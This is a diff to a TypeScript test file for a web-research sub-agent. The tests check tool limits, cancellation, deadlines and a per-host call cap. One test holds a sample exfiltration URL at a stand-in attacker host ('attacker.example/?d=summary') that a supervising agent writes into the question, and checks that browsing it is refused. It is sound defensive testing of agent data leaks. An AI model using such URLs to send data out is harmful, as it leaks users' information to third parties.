@@ -1,7 +1,7 @@
 import { expect, test, vi } from 'vitest';
 import { createWorkflowContext, emptyTokenUsage } from 'runling';
 import type { AgentExtensionAPI, AgentOptions } from 'runling/agents';
-import { createResearch } from './research.ts';
+import { createResearch, researchExtension } from './research.ts';
 
 const cloudflare = { accountId: '0123456789abcdef0123456789abcdef', apiToken: 'cf-token' };
 
@@ -45,9 +45,10 @@ test('the research agent sees only the question and has only web tools', async (
   const fake = fakeResearchAgent(async (call) => {
     await call('webSearch', { query: 'chatto bridges' });
     await call('browsePage', { url: 'https://user.example/page' });
-    await expect(call('browsePage', { url: 'https://attacker.example/?d=x' })).rejects.toThrow(
-      'can open only'
-    );
+    // The supervisor wrote this URL into the question; only user-written URLs are allowed.
+    await expect(
+      call('browsePage', { url: 'https://attacker.example/?d=summary' })
+    ).rejects.toThrow('can open only');
     return {
       outcome: 'completed',
       summary: 'Found bridges',
@@ -57,9 +58,15 @@ test('the research agent sees only the question and has only web tools', async (
   });
   const research = createResearch(
     { tavilyApiKey: 'tvly-key', cloudflare },
-    { createAgent: fake.createAgent, request, model: 'test/model' }
+    {
+      createAgent: fake.createAgent,
+      request,
+      model: 'test/model',
+      userText: () => 'What bridges exist? Maybe https://user.example/page helps.'
+    }
   );
-  const question = 'Which Chatto bridges exist? See https://user.example/page';
+  const question =
+    'Which Chatto bridges exist? See https://user.example/page and https://attacker.example/?d=summary';
   const result = await research(createWorkflowContext(), { question });
   expect(result).toEqual({
     outcome: 'completed',
@@ -120,4 +127,69 @@ test('blocked, provider, and timed-out research return a blocked result', async 
     )
   ).toMatchObject({ outcome: 'blocked', answer: 'The research did not finish in time.' });
   expect(slow.dispose).toHaveBeenCalledOnce();
+});
+
+test('parent cancellation fails the research instead of returning a result', async () => {
+  const controller = new AbortController();
+  const fake = fakeResearchAgent(async () => {
+    controller.abort(new Error('Cancelled from Chatto'));
+    throw new Error('aborted');
+  });
+  await expect(
+    createResearch({ tavilyApiKey: 'k' }, { createAgent: fake.createAgent })(
+      { ...createWorkflowContext(), signal: controller.signal },
+      { question: 'q' }
+    )
+  ).rejects.toThrow();
+  expect(fake.dispose).toHaveBeenCalledOnce();
+});
+
+test('a completed report at the deadline keeps its answer', async () => {
+  const fake = fakeResearchAgent(
+    () =>
+      new Promise((resolve) =>
+        setTimeout(
+          () =>
+            resolve({
+              outcome: 'completed',
+              summary: 'Done',
+              details: 'Late but complete',
+              usage: emptyTokenUsage()
+            }),
+          30
+        )
+      )
+  );
+  expect(
+    await createResearch({ tavilyApiKey: 'k' }, { createAgent: fake.createAgent, timeoutMs: 5 })(
+      createWorkflowContext(),
+      { question: 'q' }
+    )
+  ).toMatchObject({ outcome: 'completed', answer: 'Late but complete' });
+});
+
+test('researchWeb refuses calls beyond the host limit before starting an agent', async () => {
+  const fake = fakeResearchAgent(async () => ({
+    outcome: 'completed',
+    summary: 'Done',
+    details: 'Answer',
+    usage: emptyTokenUsage()
+  }));
+  let left = 1;
+  const tools = new Map<string, { execute(id: string, input: never): Promise<unknown> }>();
+  const extension = researchExtension(
+    createWorkflowContext() as never,
+    { tavilyApiKey: 'k' },
+    { createAgent: fake.createAgent, take: () => left-- > 0 }
+  );
+  const factory = typeof extension === 'function' ? extension : extension.factory;
+  await factory({
+    registerTool(tool) {
+      tools.set(tool.name, tool as never);
+    }
+  } as AgentExtensionAPI);
+  const research = () => tools.get('researchWeb')!.execute('call', { question: 'q' } as never);
+  expect(JSON.stringify(await research())).toContain('Answer');
+  await expect(research()).rejects.toThrow('research limit');
+  expect(fake.created).toHaveLength(1);
 });
